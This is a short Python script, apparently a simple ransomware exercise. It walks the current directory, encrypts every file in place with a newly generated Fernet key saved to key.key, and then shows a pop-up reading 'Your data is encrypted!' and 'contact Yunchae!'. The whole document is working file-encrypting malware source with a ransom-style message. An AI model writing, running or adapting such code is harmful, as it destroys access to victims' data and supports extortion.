# !usr/bin/env python3

import os

from cryptography.fernet import Fernet

import tkinter as tk
from tkinter import messagebox

All_files = []

for root, dirs, files in os.walk("."):
    for file in files:
        path = os.path.join(root,file)
        
        if path == "./encrypting.py" or path == "./key.key" or path == "./decrypting.py":
            continue
        All_files.append(path)


key = Fernet.generate_key()



with open("key.key", "wb") as thekey:
    thekey.write(key)

for file in All_files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    
    content_encrypted = Fernet(key).encrypt(content)

    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)

root = tk.Tk()
root.withdraw()

messagebox.showinfo("Your data is encrypted!", "contact Yunchae!")